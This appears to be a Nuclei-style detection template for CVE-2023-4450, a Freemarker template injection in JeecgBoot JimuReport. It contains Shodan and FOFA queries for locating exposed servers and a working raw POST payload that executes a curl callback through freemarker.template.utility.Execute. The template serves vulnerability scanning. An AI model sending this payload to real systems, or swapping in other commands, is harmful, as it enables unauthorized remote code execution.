id: CVE-2023-4450

info:
  name: JeecgBoot JimuReport - Template injection
  author: Sumanth Vankineni
  severity: critical
  description: |
    A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.
  impact: |
   Unauthorized api called /jmreport/queryFieldBySql led to remote arbitrary code execution due to parsing SQL statements using Freemarker.
  remediation: |
   Upgrading to version 1.6.1 is able to address this issue. It is recommended to upgrade the affected component.
  reference:
    - https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
    - https://whoopsunix.com/docs/java/named%20module/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4450
  classification:
    epss-score: 0.90234
    epss-percentile: 0.99582
  metadata:
    verified: true
    max-request: 1
    vendor: jeecg
    product: jeecg
    shodan-query:
      - title:"Jeecg-Boot"
      - http.title:"jeecg-boot"
    fofa-query:
      - title="JeecgBoot 企业级低代码平台"
      - title="jeecg-boot"
      - title="jeecgboot 企业级低代码平台"
    google-query: intitle:"jeecg-boot"
  tags: cve,cve2023,rce,jeecgboot,vkev,vuln


http:
  - raw:
      - |
        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl http://{{interactsh-url}}\")} ",
          "type": "0"
        }

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
          - 'status_code == 200'
          - 'contains(content_type,"application/json")'
          - 'contains(body,"success")'
        condition: and
# digest: 490a0046304402206a80b73ce0775696edd6fb45010be9dc1f92c524200a55a0f8d8b36c5e2283e50220601445e4fe68bf69f4b1322293f7948d0b0895b7acf0a3f57b76bcfe223ab551:922c64590222798bb761d5b6d8e72950